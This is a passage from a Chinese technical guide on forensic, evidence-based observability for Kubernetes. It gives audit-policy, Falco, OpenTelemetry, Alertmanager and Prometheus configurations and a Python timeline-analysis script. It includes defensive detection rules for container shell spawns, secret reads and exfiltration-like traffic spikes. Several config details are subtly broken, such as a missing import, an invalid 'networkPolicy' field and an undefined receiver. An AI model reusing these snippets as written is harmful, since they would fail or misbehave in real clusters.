---
title: 第三章：FEBM 最佳实践
description: 'title: 第三章：FEBM 最佳实践'
category: febm
tags:
- febm
- troubleshooting
- best-practice
- apiserver
- prometheus
- grafana
- jaeger
- containerd
- cri-o
- docker
last_updated: 2026-05
difficulty: expert
reading_level: expert
audience:
- SRE
- 运维专家
- 技术支持
estimated_read_time: 90min
intent_queries:
- 第三章：FEBM 最佳实践 是什么
- 如何 第三章：FEBM 最佳实践
- Kubernetes 10 troubleshooting diagnostics 最佳实践
- 第三章：FEBM 最佳实践 故障排查
- 第三章：FEBM 最佳实践 排障步骤
trigger_keywords:
- 第三章：FEBM
- 最佳实践
- troubleshooting
- diagnostics
- febm
prerequisites:
- kubectl-basics
- troubleshooting-methodology
- prometheus-basics
- monitoring-basics
- ebpf-basics
- logging-basics
- tracing-basics
- observability-basics
---

title: 第三章：FEBM 最佳实践
description: '# 第三章：FEBM 最佳实践'
category: febm
tags:
- k8s
- forensics
- evidence-based
- methodology
- apiserver
- prometheus
- grafana
- jaeger
- containerd
- cri-o
last_updated: 2026-05
difficulty: expert
reading_level: expert
audience:
- SRE
- 运维专家
- 技术支持
estimated_read_time: 10min
intent_queries:
- 第三章：FEBM 最佳实践 是什么
- 如何 第三章：FEBM 最佳实践
trigger_keywords:
- 第三章：FEBM
- 最佳实践
- febm
authors:
- name: KUDIG Team
  role: contributor
k8s_versions:
- '1.28'
- '1.29'
- '1.30'
- '1.31'
- '1.32'
---

# 第三章：FEBM 最佳实践

> **所属系列**: FEBM 法医鉴定循证方法论深度解析  
> **关联主文档**: [FEBM 方法论深度解析](./febm-methodology-deep-dive.md)  
> **上一章**: [第二章：FEBM 技术实现体系](./[[domain-10-troubleshooting-diagnostics/topic-febm/02-febm-technical-implementation.md|02-febm-technical-implementation]].md)  
> **下一章**: [第四章：FEBM 对云平台工单智能体托管的意义](./[[domain-10-troubleshooting-diagnostics/topic-febm/04-febm-agent-ticket-processing.md|04-febm-agent-ticket-processing]].md)

---

<!-- chunk: 概述 -->## 概述

本章详细阐述 FEBM 在 Kubernetes 云原生环境中的实施最佳实践。从可观测性基础设施建设到证据采集策略，从事件响应流程到取证即代码（Forensics as Code），本章提供可操作的指导和实战经验总结。

**核心原则**：
1. **Evidence First** - 证据优先于假设
2. **Continuous Forensics** - 持续取证而非事后补救
3. **Integrity Assurance** - 证据完整性全生命周期保障
4. **Reproducibility** - 分析过程可重现可审计
5. **Multi-Source Correlation** - 多源证据交叉验证

---

<!-- chunk: 3.1 可观测性基础设施建设 -->## 3.1 可观测性基础设施建设

#<!-- chunk: 3.1.1 五层可观测性架构 -->## 3.1.1 五层可观测性架构

FEBM 方法论依赖于完善的可观测性基础设施。我们提出五层架构模型，确保证据从生成到分析的完整链路：

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 5: Forensic Analysis                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Jupyter     │  │  Grafana     │  │  Custom      │             │
│  │  Notebooks   │  │  Dashboards  │  │  Analysis    │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
└─────────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Query Interface
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 4: Detection & Alerting                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Prometheus  │  │  Falco       │  │  Custom      │             │
│  │  AlertMgr    │  │  Sidekick    │  │  Detectors   │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
└─────────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Rule Evaluation
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 3: Storage & Indexing                      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Prometheus  │  │  Loki        │  │  Elasticsearch│            │
│  │  (Metrics)   │  │  (Logs)      │  │  (Audit Logs) │            │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
│  ┌──────────────┐  ┌──────────────┐                               │
│  │  Tempo       │  │  S3/MinIO    │                               │
│  │  (Traces)    │  │  (Cold Store)│                               │
│  └──────────────┘  └──────────────┘                               │
└─────────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Data Ingestion
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 2: Collection & Aggregation                │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Prometheus  │  │  Fluentd/    │  │  OpenTelemetry│            │
│  │  Exporters   │  │  Fluent Bit  │  │  Collector    │            │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
│  ┌──────────────┐  ┌──────────────┐                               │
│  │  Falco       │  │  Audit        │                               │
│  │  (Runtime)   │  │  Webhook     │                               │
│  └──────────────┘  └──────────────┘                               │
└─────────────────────────────────────────────────────────────────────┘
                              ▲
                              │ Data Generation
┌─────────────────────────────────────────────────────────────────────┐
│                    Layer 1: Data Production                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │  Application │  │  Kubernetes  │  │  Kernel      │             │
│  │  Metrics/    │  │  API Server  │  │  (eBPF)      │             │
│  │  Logs/Traces │  │  Audit Logs  │  │              │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
│  ┌──────────────┐  ┌──────────────┐                               │
│  │  Container   │  │  Network     │                               │
│  │  Runtime     │  │  Traffic     │                               │
│  └──────────────┘  └──────────────┘                               │
└─────────────────────────────────────────────────────────────────────┘
```

#<!-- chunk: 3.1.2 各层详细说明 -->## 3.1.2 各层详细说明

##<!-- chunk: Layer 1: 数据生产层 -->## Layer 1: 数据生产层

**职责**：生成原始可观测性数据和取证证据源

**关键组件**：

| 数据源 | 证据类型 | 挥发性 | 取证价值 | 配置要点 |
|--------|---------|--------|---------|---------|
| Kubernetes Audit Logs | API 操作记录 | 低 | 极高 | `RequestResponse` level |
| Container Runtime Logs | stdout/stderr | 中 | 高 | JSON structured logging |
| Kernel eBPF Events | 系统调用、网络连接 | 高 | 极高 | Falco/Tetragon 探针 |
| Application Metrics | Prometheus metrics | 中 | 中 | `/metrics` endpoint |
| Application Traces | OpenTelemetry spans | 中 | 高 | W3C Trace Context |
| Network Traffic | Packets, flows | 高 | 高 | CNI plugin + eBPF |
| Container Filesystems | Files, configs | 低 | 中 | Volume snapshots |

**配置示例：Kubernetes Audit Policy**

```yaml
# audit-policy.yaml - FEBM 推荐配置
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # 关键安全事件 - RequestResponse 级别（完整请求响应体）
  - level: RequestResponse
    verbs: ["create", "update", "patch", "delete"]
    resources:
      - group: ""
        resources: ["pods", "secrets", "configmaps", "serviceaccounts"]
      - group: "apps"
        resources: ["deployments", "daemonsets", "statefulsets"]
      - group: "rbac.authorization.k8s.io"
        resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
    
  # Pod 执行命令 - 取证关键证据
  - level: RequestResponse
    verbs: ["create"]
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach"]
    
  # 其他写操作 - Metadata 级别
  - level: Metadata
    verbs: ["create", "update", "patch", "delete"]
    
  # 读操作 - Request 级别（用于检测数据窃取）
  - level: Request
    verbs: ["get", "list", "watch"]
    resources:
      - group: ""
        resources: ["secrets"]
    
  # 其他读操作 - Metadata 级别
  - level: Metadata
    verbs: ["get", "list", "watch"]
    
  # 健康检查 - 不记录
  - level: None
    nonResourceURLs:
      - "/healthz*"
      - "/version"
      - "/metrics"
```

**配置示例：Falco eBPF 探针**

```yaml
# falco-config.yaml
falco:
  rules_file:
    - /etc/falco/falco_rules.yaml
    - /etc/falco/febm_custom_rules.yaml
  
  # 启用 JSON 输出便于结构化存储
  json_output: true
  json_include_output_property: true
  
  # 包含容器和 K8s 元数据
  json_include_tags_property: true
  
  # 文件输出配置（带时间戳哈希）
  file_output:
    enabled: true
    keep_alive: false
    filename: "/var/log/falco/falco-events-%Y%m%d-%H%M%S.json"
  
  # 系统调用缓冲区大小（根据负载调整）
  syscall_event_drops:
    threshold: 0.1
    actions:
      - log
      - alert
  
  # eBPF 探针配置
  ebpf:
    probe: ${HOME}/.falco/falco-bpf.o
    
# 自定义 FEBM 规则
# /etc/falco/febm_custom_rules.yaml
- rule: Suspicious Container Shell Spawn
  desc: Detect unexpected shell spawned in container
  condition: >
    spawned_process and 
    container and
    proc.name in (shell_binaries) and
    not proc.pname in (allowed_parent_processes)
  output: >
    Shell spawned in container (user=%user.name container=%container.name 
    image=%container.image.repository proc=%proc.cmdline parent=%proc.pname 
    terminal=%proc.tty uid=%user.uid)
  priority: WARNING
  tags: [container, shell, febm_runtime, mitre_execution]
  
  # FEBM 增强：记录完整环境变量和工作目录
  output_fields:
    - user.name
    - container.id
    - container.name
    - container.image.repository
    - proc.cmdline
    - proc.env
    - proc.cwd
    - proc.tty
    - fd.name
```

##<!-- chunk: Layer 2: 采集与聚合层 -->## Layer 2: 采集与聚合层

**职责**：收集、预处理、路由可观测性数据

**OpenTelemetry 作为统一层**

```yaml
# otel-collector-config.yaml
receivers:
  # Prometheus metrics
  prometheus:
    config:
      scrape_configs:
        - job_name: 'kubernetes-pods'
          kubernetes_sd_configs:
            - role: pod
          relabel_configs:
            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
              action: keep
              regex: true
  
  # Kubernetes events
  k8s_events:
    auth_type: serviceAccount
    namespaces: [all]
  
  # Falco events (via HTTP receiver)
  otlp:
    protocols:
      http:
        endpoint: 0.0.0.0:4318
      grpc:
        endpoint: 0.0.0.0:4317
  
  # Fluent Forward protocol (Fluentd/Fluent Bit)
  fluentforward:
    endpoint: 0.0.0.0:8006

processors:
  # FEBM 关键：添加证据元数据
  resource:
    attributes:
      - key: febm.collector.version
        value: "otel-collector-0.88.0"
        action: insert
      - key: febm.collection.timestamp
        from_attribute: timestamp
        action: insert
  
  # 添加数据完整性哈希
  transform:
    log_statements:
      - context: log
        statements:
          - set(attributes["febm.hash"], SHA256(body))
  
  # 批处理优化传输效率
  batch:
    timeout: 10s
    send_batch_size: 1024
  
  # K8s 元数据增强
  k8sattributes:
    auth_type: "serviceAccount"
    passthrough: false
    extract:
      metadata:
        - k8s.namespace.name
        - k8s.deployment.name
        - k8s.statefulset.name
        - k8s.daemonset.name
        - k8s.pod.name
        - k8s.pod.uid
        - k8s.node.name
        - k8s.container.name
      labels:
        - tag_name: app
          key: app.kubernetes.io/name
          from: pod

exporters:
  # Loki for logs
  loki:
    endpoint: http://loki:3100/loki/api/v1/push
    labels:
      resource:
        k8s.namespace.name: "namespace"
        k8s.pod.name: "pod"
        k8s.container.name: "container"
  
  # Prometheus for metrics
  prometheusremotewrite:
    endpoint: http://prometheus:9090/api/v1/write
    tls:
      insecure: false
  
  # Tempo for traces
  otlp/tempo:
    endpoint: tempo:4317
    tls:
      insecure: true
  
  # Elasticsearch for audit logs (WORM storage)
  elasticsearch:
    endpoints: [https://elasticsearch:9200]
    logs_index: "k8s-audit-logs"
    pipeline: "febm-audit-pipeline"
    # 启用 ILM 策略
    ilm_policy: "febm-audit-ilm-policy"

service:
  pipelines:
    logs:
      receivers: [otlp, fluentforward]
      processors: [resource, transform, k8sattributes, batch]
      exporters: [loki]
    
    logs/audit:
      receivers: [otlp/audit]
      processors: [resource, transform, batch]
      exporters: [elasticsearch]
    
    metrics:
      receivers: [prometheus]
      processors: [resource, k8sattributes, batch]
      exporters: [prometheusremotewrite]
    
    traces:
      receivers: [otlp]
      processors: [resource, k8sattributes, batch]
      exporters: [otlp/tempo]
```

##<!-- chunk: Layer 3: 存储与索引层 -->## Layer 3: 存储与索引层

**职责**：持久化证据数据，支持高效检索

**存储架构设计**：

```
┌─────────────────────────────────────────────────────────────────┐
│                        Hot Storage (7 days)                     │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐      │
│  │  Prometheus   │  │  Loki         │  │  Tempo        │      │
│  │  (Metrics)    │  │  (Logs)       │  │  (Traces)     │      │
│  │  - 15s res    │  │  - Full text  │  │  - Full spans │      │
│  │  - SSD        │  │  - SSD/NVMe   │  │  - SSD        │      │
│  └───────────────┘  └───────────────┘  └───────────────┘      │
└─────────────────────────────────────────────────────────────────┘
                            ▼ Auto-tiering
┌─────────────────────────────────────────────────────────────────┐
│                       Warm Storage (30 days)                    │
│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐      │
│  │  Prometheus   │  │  Loki         │  │  S3/MinIO     │      │
│  │  (Downsampled)│  │  (Compressed) │  │  (Traces)     │      │
│  │  - 5m res     │  │  - HDD        │  │               │      │
│  │  - HDD        │  │               │  │               │      │
│  └───────────────┘  └───────────────┘  └───────────────┘      │
└─────────────────────────────────────────────────────────────────┘
                            ▼ Archive
┌─────────────────────────────────────────────────────────────────┐
│                      Cold Storage (1-7 years)                   │
│  ┌───────────────────────────────────────────────────────┐     │
│  │  S3 Glacier / MinIO with WORM                         │     │
│  │  - Compressed Parquet format                          │     │
│  │  - Immutable (legal compliance)                       │     │
│  │  - Indexed metadata in separate DB                    │     │
│  └───────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│              Critical Evidence Store (WORM)                     │
│  ┌───────────────────────────────────────────────────────┐     │
│  │  Elasticsearch with Index Lifecycle Management        │     │
│  │  - K8s Audit Logs (RequestResponse level)             │     │
│  │  - Falco Security Events                              │     │
│  │  - SHA-256 hashed at ingestion                        │     │
│  │  - NTP-synchronized timestamps                        │     │
│  │  - Retention: 1-7 years (compliance requirement)      │     │
│  └───────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘
```

**Elasticsearch ILM 策略示例**：

```json
{
  "policy": "febm-audit-ilm-policy",
  "phases": {
    "hot": {
      "actions": {
        "rollover": {
          "max_size": "50GB",
          "max_age": "1d"
        },
        "set_priority": {
          "priority": 100
        }
      }
    },
    "warm": {
      "min_age": "7d",
      "actions": {
        "forcemerge": {
          "max_num_segments": 1
        },
        "shrink": {
          "number_of_shards": 1
        },
        "set_priority": {
          "priority": 50
        }
      }
    },
    "cold": {
      "min_age": "30d",
      "actions": {
        "freeze": {},
        "set_priority": {
          "priority": 0
        }
      }
    },
    "delete": {
      "min_age": "2555d",
      "actions": {
        "delete": {}
      }
    }
  }
}
```

**数据保留策略表**：

| 数据类型 | Hot (SSD) | Warm (HDD) | Cold (S3) | 总保留期 | 法规依据 |
|---------|-----------|------------|-----------|---------|---------|
| K8s Audit Logs | 7 天 | 30 天 | 7 年 | 7 年 | SOC 2, PCI-DSS |
| Falco Security Events | 7 天 | 30 天 | 7 年 | 7 年 | ISO 27001 |
| Application Logs | 7 天 | 30 天 | 90 天 | 90 天 | 内部政策 |
| Prometheus Metrics | 7 天 (15s) | 30 天 (5m) | 1 年 (1h) | 1 年 | 性能分析需求 |
| Traces (全量) | 7 天 | 30 天 | - | 30 天 | 成本优化 |
| Traces (采样) | - | - | 1 年 | 1 年 | 长期趋势分析 |
| Network Flows | 3 天 | 7 天 | 30 天 | 30 天 | 成本优化 |
| Container Checkpoints | - | 7 天 | 30 天 | 30 天 | 按需触发 |

##<!-- chunk: Layer 4: 检测与告警层 -->## Layer 4: 检测与告警层

**职责**：实时分析证据流，检测异常，触发响应

**多层检测架构**：

```
┌─────────────────────────────────────────────────────────────────┐
│                     L4.1: Real-time Detection                   │
│  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐   │
│  │ Falco          │  │ Prometheus     │  │ Custom         │   │
│  │ - Syscall      │  │ AlertManager   │  │ Detectors      │   │
│  │   anomalies    │  │ - Metric       │  │ - ML-based     │   │
│  │ - Runtime      │  │   thresholds   │  │ - Behavioral   │   │
│  │   policies     │  │ - Rate changes │  │   analysis     │   │
│  └────────────────┘  └────────────────┘  └────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                             ▼ Alert
┌─────────────────────────────────────────────────────────────────┐
│                    L4.2: Event Correlation                      │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  Multi-signal Correlation Engine                        │   │
│  │  - Time window: 5-minute sliding window                 │   │
│  │  - Correlation keys: pod_uid, trace_id, user            │   │
│  │  - Severity escalation: multiple weak signals → strong  │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                             ▼ Correlated Alert
┌─────────────────────────────────────────────────────────────────┐
│                    L4.3: Response Orchestration                 │
│  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐   │
│  │ Trigger        │  │ Evidence       │  │ Notify         │   │
│  │ Enhanced       │  │ Collection     │  │ On-call        │   │
│  │ Collection     │  │ Escalation     │  │ Team           │   │
│  └────────────────┘  └────────────────┘  └────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

**Prometheus AlertManager 配置示例**：

```yaml
# alertmanager.yml
route:
  receiver: 'default'
  group_by: ['alertname', 'cluster', 'namespace']
  group_wait: 10s
  group_interval: 10s
  repeat_interval: 12h
  
  routes:
    # FEBM 高优先级：安全事件
    - match:
        severity: critical
        category: security
      receiver: 'febm-security-team'
      group_wait: 0s
      repeat_interval: 5m
      continue: true  # 同时发送到其他 receiver
    
    # FEBM 中优先级：性能异常
    - match:
        severity: warning
        category: performance
      receiver: 'febm-sre-team'
      group_wait: 30s
      repeat_interval: 1h

receivers:
  - name: 'febm-security-team'
    webhook_configs:
      - url: 'http://febm-orchestrator:8080/webhook/security'
        send_resolved: true
        http_config:
          bearer_token: '<secret>'
    pagerduty_configs:
      - service_key: '<pagerduty-key>'
        severity: 'critical'

  - name: 'febm-sre-team'
    slack_configs:
      - api_url: '<slack-webhook>'
        channel: '#febm-alerts'
        title: 'FEBM Alert: {{ .GroupLabels.alertname }}'
        text: '{{ range .Alerts }}{{ .Annotations.description }}{{ end }}'

inhibit_rules:
  # 抑制低优先级告警（当高优先级告警已触发）
  - source_match:
      severity: 'critical'
    target_match:
      severity: 'warning'
    equal: ['alertname', 'namespace', 'pod']
```

**自定义检测规则示例（Prometheus）**：

```yaml
# prometheus-rules.yaml
groups:
  - name: febm-runtime-security
    interval: 30s
    rules:
      # 异常系统调用频率
      - alert: AnomalousSystemCallRate
        expr: |
          rate(falco_events_total{priority="Warning"}[5m]) > 10
        for: 2m
        labels:
          severity: warning
          category: security
          febm_evidence: "falco_events"
        annotations:
          summary: "Abnormal syscall rate in {{ $labels.namespace }}/{{ $labels.pod }}"
          description: "Falco detected {{ $value }} suspicious syscalls/sec"
          runbook_url: "https://wiki.example.com/febm/runbooks/syscall-anomaly"
      
      # Pod 内网络连接突增
      - alert: SuspiciousNetworkActivity
        expr: |
          (
            rate(container_network_transmit_bytes_total[5m])
            /
            avg_over_time(container_network_transmit_bytes_total[24h])
          ) > 10
        for: 5m
        labels:
          severity: warning
          category: security
          febm_evidence: "network_metrics"
        annotations:
          summary: "10x network traffic increase in {{ $labels.namespace }}/{{ $labels.pod }}"
          description: "Current rate: {{ $value }} bytes/sec"
      
      # 容器重启循环（可能遭受攻击后自愈）
      - alert: ContainerRestartLoop
        expr: |
          rate(kube_pod_container_status_restarts_total[15m]) > 0.1
        for: 5m
        labels:
          severity: warning
          category: availability
          febm_trigger: "checkpoint_container"
        annotations:
          summary: "Container restart loop in {{ $labels.namespace }}/{{ $labels.pod }}"
          description: "Restart rate: {{ $value }}/sec - may indicate compromise"
          febm_action: "Trigger container checkpoint before next restart"
```

##<!-- chunk: Layer 5: 取证分析层 -->## Layer 5: 取证分析层

**职责**：交互式证据分析，假设验证，报告生成

**分析环境架构**：

```yaml
# jupyter-forensics-env.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: febm-analysis
  labels:
    febm.io/isolated: "true"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jupyter-forensics
  namespace: febm-analysis
spec:
  replicas: 1
  template:
    spec:
      # 网络隔离：仅允许访问证据存储
      networkPolicy: restricted
      
      containers:
      - name: jupyter
        image: jupyter/scipy-notebook:latest
        env:
          # 只读访问证据存储
          - name: PROMETHEUS_URL
            value: "http://prometheus.monitoring.svc:9090"
          - name: LOKI_URL
            value: "http://loki.monitoring.svc:3100"
          - name: ELASTICSEARCH_URL
            value: "https://elasticsearch.monitoring.svc:9200"
          - name: ELASTICSEARCH_READONLY_TOKEN
            valueFrom:
              secretKeyRef:
                name: es-readonly-token
                key: token
        
        volumeMounts:
          # 预置取证工具和库
          - name: forensics-tools
            mountPath: /home/jovyan/tools
          - name: analysis-notebooks
            mountPath: /home/jovyan/notebooks
      
      volumes:
        - name: forensics-tools
          configMap:
            name: febm-analysis-tools
        - name: analysis-notebooks
          persistentVolumeClaim:
            claimName: analysis-workspace
---
# 网络策略：隔离分析环境
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: forensics-isolation
  namespace: febm-analysis
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
  egress:
    # 仅允许访问证据存储（只读）
    - to:
      - namespaceSelector:
          matchLabels:
            name: monitoring
      ports:
        - protocol: TCP
          port: 9090  # Prometheus
        - protocol: TCP
          port: 3100  # Loki
        - protocol: TCP
          port: 9200  # Elasticsearch
    # DNS 解析
    - to:
      - namespaceSelector:
          matchLabels:
            name: kube-system
      ports:
        - protocol: UDP
          port: 53
```

**预置分析脚本示例**：

```python
# /tools/febm_timeline_analysis.py
"""
FEBM Timeline Reconstruction Tool
用于从多数据源重建事件时间线
"""

import pandas as pd
from datetime import datetime, timedelta
from prometheus_api_client import PrometheusConnect
from grafana_loki_client import LokiClient
from elasticsearch import Elasticsearch

class FEBMTimelineAnalyzer:
    def __init__(self, pod_uid, time_window_minutes=60):
        self.pod_uid = pod_uid
        self.start_time = datetime.now() - timedelta(minutes=time_window_minutes)
        self.end_time = datetime.now()
        
        # 连接证据存储
        self.prom = PrometheusConnect(url="http://prometheus.monitoring.svc:9090")
        self.loki = LokiClient(url="http://loki.monitoring.svc:3100")
        self.es = Elasticsearch(
            ["https://elasticsearch.monitoring.svc:9200"],
            api_key=os.getenv("ELASTICSEARCH_READONLY_TOKEN")
        )
    
    def collect_evidence(self):
        """收集所有相关证据"""
        evidence = {
            'audit_logs': self._get_audit_logs(),
            'falco_events': self._get_falco_events(),
            'container_metrics': self._get_container_metrics(),
            'application_logs': self._get_application_logs(),
            'network_flows': self._get_network_flows()
        }
        return evidence
    
    def _get_audit_logs(self):
        """获取 K8s 审计日志"""
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"objectRef.uid": self.pod_uid}},
                        {"range": {"requestReceivedTimestamp": {
                            "gte": self.start_time.isoformat(),
                            "lte": self.end_time.isoformat()
                        }}}
                    ]
                }
            },
            "sort": [{"requestReceivedTimestamp": {"order": "asc"}}]
        }
        
        results = self.es.search(index="k8s-audit-logs-*", body=query)
        
        events = []
        for hit in results['hits']['hits']:
            source = hit['_source']
            events.append({
                'timestamp': source['requestReceivedTimestamp'],
                'source': 'k8s_audit',
                'verb': source['verb'],
                'resource': f"{source['objectRef']['resource']}/{source['objectRef']['name']}",
                'user': source['user']['username'],
                'response_code': source['responseStatus']['code'],
                'audit_id': source['auditID'],
                'raw': source
            })
        
        return pd.DataFrame(events)
    
    def _get_falco_events(self):
        """获取 Falco 安全事件"""
        # 从 Elasticsearch 查询 Falco 事件
        query = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"k8s.pod.uid": self.pod_uid}},
                        {"range": {"time": {
                            "gte": self.start_time.isoformat(),
                            "lte": self.end_time.isoformat()
                        }}}
                    ]
                }
            },
            "sort": [{"time": {"order": "asc"}}]
        }
        
        results = self.es.search(index="falco-events-*", body=query)
        
        events = []
        for hit in results['hits']['hits']:
            source = hit['_source']
            events.append({
                'timestamp': source['time'],
                'source': 'falco',
                'rule': source['rule'],
                'priority': source['priority'],
                'output': source['output'],
                'fields': source['output_fields'],
                'raw': source
            })
        
        return pd.DataFrame(events)
    
    def reconstruct_timeline(self):
        """重建统一时间线"""
        evidence = self.collect_evidence()
        
        # 合并所有数据源
        all_events = []
        for source, df in evidence.items():
            if not df.empty:
                df['evidence_source'] = source
                all_events.append(df)
        
        timeline = pd.concat(all_events, ignore_index=True)
        timeline['timestamp'] = pd.to_datetime(timeline['timestamp'])
        timeline = timeline.sort_values('timestamp')
        
        return timeline
    
    def visualize_timeline(self, timeline):
        """可视化时间线"""
        import matplotlib.pyplot as plt
        import matplotlib.dates as mdates
        
        fig, ax = plt.subplots(figsize=(16, 8))
        
        # 为不同证据源分配不同颜色
        colors = {
            'k8s_audit': 'blue',
            'falco': 'red',
            'container_metrics': 'green',
            'application_logs': 'orange',
            'network_flows': 'purple'
        }
        
        for source, group in timeline.groupby('evidence_source'):
            ax.scatter(group['timestamp'], [source]*len(group), 
                      c=colors.get(source, 'gray'), label=source, alpha=0.6)
        
        ax.set_xlabel('Time')
        ax.set_ylabel('Evidence Source')
        ax.set_title(f'FEBM Timeline Reconstruction - Pod UID: {self.pod_uid}')
        ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
        ax.legend()
        
        plt.tight_layout()
        return fig

# 使用示例
if __name__ == "__main__":
    analyzer = FEBMTimelineAnalyzer(
        pod_uid="a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        time_window_minutes=60
    )
    
    timeline = analyzer.reconstruct_timeline()
    print(timeline.head(20))
    
    fig = analyzer.visualize_timeline(timeline)
    fig.savefig('timeline.png')
```

#<!-- chunk: 3.1.3 工具选型对比表 -->## 3.1.3 工具选型对比表

| 层级 | 能力域 | 工具选项 | FEBM 推荐 | 推荐理由 |
|------|--------|---------|-----------|---------|
| L2 采集层 | Logs | Fluentd / Fluent Bit / Logstash | **Fluent Bit** | 轻量级、K8s 原生、性能优异 |
| L2 采集层 | Metrics | Prometheus / OpenTelemetry | **OpenTelemetry** | 统一标准、支持多后端 |
| L2 采集层 | Runtime Security | Falco / Sysdig / Aqua | **Falco** | 开源、eBPF 原生、规则灵活 |
| L3 存储层 | Logs | Loki / Elasticsearch / Splunk | **Loki (hot) + Elasticsearch (WORM)** | Loki 成本低、ES 合规性强 |
| L3 存储层 | Metrics | Prometheus / Thanos / Cortex | **Prometheus + Thanos** | Thanos 支持长期存储和 HA |
| L3 存储层 | Traces | Jaeger / Tempo / Zipkin | **Tempo** | 原生支持 S3、与 Grafana 集成 |
| L4 检测层 | Real-time | Falco / Prometheus Alerts | **Both** | 互补：系统调用 + 指标阈值 |
| L5 分析层 | Visualization | Grafana / Kibana | **Grafana** | 统一界面、支持多数据源 |

#<!-- chunk: 3.1.4 高可用性配置 -->## 3.1.4 高可用性配置

**关键原则**：证据基础设施本身不能成为单点故障

```yaml
# prometheus-ha.yaml
apiVersion: monitoring.coreos.com/v1
kind: Prometheus
metadata:
  name: prometheus-ha
  namespace: monitoring
spec:
  replicas: 2  # HA 模式
  
  # 反亲和性：避免调度到同一节点
  affinity:
    podAntiAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        - labelSelector:
            matchLabels:
              app: prometheus
          topologyKey: kubernetes.io/hostname
  
  # 持久化存储
  storage:
    volumeClaimTemplate:
      spec:
        accessModes: ["ReadWriteOnce"]
        resources:
          requests:
            storage: 500Gi
        storageClassName: fast-ssd
  
  # 外部远程存储（长期保留）
  remoteWrite:
    - url: "http://thanos-receive:19291/api/v1/receive"
      queueConfig:
        capacity: 10000
        maxShards: 50
  
  # 数据保留期（本地）
  retention: 7d
  retentionSize: 450GB
```

**证据存储故障恢复 SLA**：

| 组件 | RTO (恢复时间目标) | RPO (数据丢失目标) | 实现方式 |
|------|-------------------|-------------------|---------|
| Prometheus | 5 分钟 | 0 (HA 模式) | 双活副本 + 远程写 |
| Loki | 5 分钟 | 0 (HA 模式) | 多副本 + S3 后端 |
| Elasticsearch | 15 分钟 | 0 (WORM 存储) | 集群模式 + 快照 |
| Falco | 1 分钟 | 5 分钟 | DaemonSet + 本地缓冲 |

#<!-- chunk: 3.1.5 反模式：可观测性盲区 -->## 3.1.5 反模式：可观测性盲区

**Anti-Pattern 1: 短保留期导致证据丢失**

❌ **错误做法**：
```yaml
# 仅保留 24 小时日志
prometheus:
  retention: 24h
```

**问题**：
- 周末或假期发现的安全事件无法回溯
- 慢性攻击（Advanced Persistent Threat）无法检测

✅ **正确做法**：
- Hot storage 7 天 + Warm storage 30 天 + Cold storage 按合规要求
- 关键安全事件（audit logs, Falco events）至少保留 1 年

---

**Anti-Pattern 2: 未启用 K8s Audit Logs**

❌ **错误做法**：
```yaml
# API Server 配置中未启用审计日志
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
spec:
  containers:
  - name: kube-apiserver
    command:
      - kube-apiserver
      # 缺少 --audit-policy-file 和 --audit-log-path
```

**问题**：
- 无法回溯 "谁在何时对集群做了什么操作"
- 丧失最权威的证据源

✅ **正确做法**：
- 启用 `RequestResponse` 级别审计（对关键资源）
- 使用 webhook 后端实时导出到 Elasticsearch

---

**Anti-Pattern 3: 仅依赖应用日志**

❌ **错误做法**：
```python
# 应用仅输出业务日志
logger.info(f"User {user_id} logged in")
```

**问题**：
- 攻击者可篡改应用日志
- 无法检测底层系统调用异常

✅ **正确做法**：
- 应用日志 + Falco 系统调用日志 + K8s 审计日志 = 多层防御
- 交叉验证发现矛盾（应用显示成功，但 Falco 检测到可疑行为）

---

<!-- chunk: 3.2 证据采集策略 -->## 3.2 证据采集策略

#<!-- chunk: 3.2.1 核心原则 -->## 3.2.1 核心原则

##<!-- chunk: 原则 1：按挥发性优先级分层采集 -->## 原则 1：按挥发性优先级分层采集

**挥发性金字塔**：

```
        ▲ 挥发性（越高越易丢失）
        │
        │  ┌─────────────────────────────────┐
        │  │  CPU 寄存器、内存内容            │ ← 极高挥发性
        │  │  TTL: 毫秒级                     │   （容器销毁即丢失）
        │  └─────────────────────────────────┘
        │  ┌─────────────────────────────────┐
